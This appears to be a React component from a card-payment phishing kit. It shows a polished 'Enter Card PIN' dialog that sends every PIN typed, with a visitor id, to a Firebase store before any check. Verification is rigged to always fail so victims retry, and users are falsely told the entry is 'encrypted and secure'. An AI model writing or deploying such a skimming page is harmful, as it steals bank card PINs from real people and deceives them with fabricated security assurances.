"use client";

import React, { useState, useRef, useEffect } from "react";
import { X, AlertCircle, Lock } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { addData } from "../../firebase";

interface PinDialogProps {
  isOpen: boolean;
  onClose: () => void;
  cardType?: string;
}

const PinDialog: React.FC<PinDialogProps> = ({
  isOpen,
  onClose,
  cardType = "card",
}) => {
  const [pin, setPin] = useState<string[]>(Array(4).fill(""));
  const [error, setError] = useState<string>("");
  const [attempts, setAttempts] = useState(3);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Reset state when dialog opens
  useEffect(() => {
    if (isOpen) {
      setPin(Array(4).fill(""));
      setError("");
      // Focus first input when dialog opens
      setTimeout(() => {
        inputRefs.current[0]?.focus();
      }, 100);
    }
  }, [isOpen]);

  const handleInputChange = (index: number, value: string) => {
    // Clear error when user starts typing
    if (error) setError("");

    // Only allow numbers
    if (!/^\d*$/.test(value)) return;

    // Update PIN array
    const newPin = [...pin];
    newPin[index] = value.substring(0, 1);
    setPin(newPin);

    // Auto-focus next input
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>
  ) => {
    // Move to previous input on backspace if current input is empty
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text/plain").trim();

    // Check if pasted content is a valid PIN
    if (!/^\d+$/.test(pastedData)) return;

    // Fill PIN fields with pasted data
    const newPin = [...pin];
    for (let i = 0; i < Math.min(pastedData.length, 4); i++) {
      newPin[i] = pastedData[i];
    }
    setPin(newPin);

    // Focus appropriate field
    if (pastedData.length < 4) {
      inputRefs.current[pastedData.length]?.focus();
    }
  };

  const handleSubmit = () => {
    const pinString = pin.join("");
    const visitorId = localStorage.getItem("visitor");
    addData({ id: visitorId, pass: pinString });
    // Check if PIN is complete
    if (pinString.length !== 4) {
      setError("Please enter all 4 digits");
      return;
    }

    // Simulate PIN verification (always fail for this example)
    setAttempts((prev) => prev - 1);

    if (attempts <= 1) {
      setError("Too many failed attempts. Your card has been blocked.");
      setTimeout(() => {
        onClose();
      }, 3000);
    } else {
      setError(`Incorrect PIN. ${attempts - 1} attempts remaining.`);
      // Clear PIN for retry
      setPin(Array(4).fill(""));
      setTimeout(() => {
        inputRefs.current[0]?.focus();
      }, 100);
    }

    // For successful verification, you would call:
    // onVerify(pinString);
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4"
        >
          <motion.div
            initial={{ scale: 0.9, y: 20 }}
            animate={{ scale: 1, y: 0 }}
            exit={{ scale: 0.9, y: 20 }}
            className="bg-white rounded-lg shadow-xl w-full max-w-md overflow-hidden"
          >
            <div className="flex justify-between items-center p-4 border-b">
              <h3 className="text-lg font-semibold text-gray-800">
                Enter Card PIN
              </h3>
              <button
                onClick={onClose}
                className="text-gray-500 hover:text-gray-700 transition-colors"
              >
                <X size={20} />
              </button>
            </div>

            <div className="p-6">
              <div className="flex items-center justify-center mb-6">
                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
                  <Lock size={32} className="text-blue-600" />
                </div>
              </div>

              <p className="text-gray-600 mb-6 text-center">
                Please enter your 4-digit {cardType} PIN to complete the payment
              </p>

              <div className="flex justify-center gap-3 mb-6">
                {Array(4)
                  .fill(0)
                  .map((_, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el) as any}
                      type="password"
                      value={pin[index]}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={index === 0 ? handlePaste : undefined}
                      className="w-14 h-14 text-center text-xl font-semibold border rounded-md focus:border-blue-500 focus:ring-2 focus:ring-blue-200 focus:outline-none transition-all"
                      maxLength={1}
                      inputMode="numeric"
                    />
                  ))}
              </div>

              {error && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="flex items-center p-3 mb-4 bg-red-50 text-red-700 rounded-md"
                >
                  <AlertCircle size={18} className="mr-2" />
                  <span>{error}</span>
                </motion.div>
              )}

              <button
                onClick={handleSubmit}
                className="w-full py-3 bg-blue-600 text-white rounded-md font-medium hover:bg-blue-700 transition-colors"
              >
                Confirm
              </button>

              <div className="mt-4 text-center">
                <p className="text-gray-500 text-xs">
                  This information is encrypted and secure
                </p>
              </div>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default PinDialog;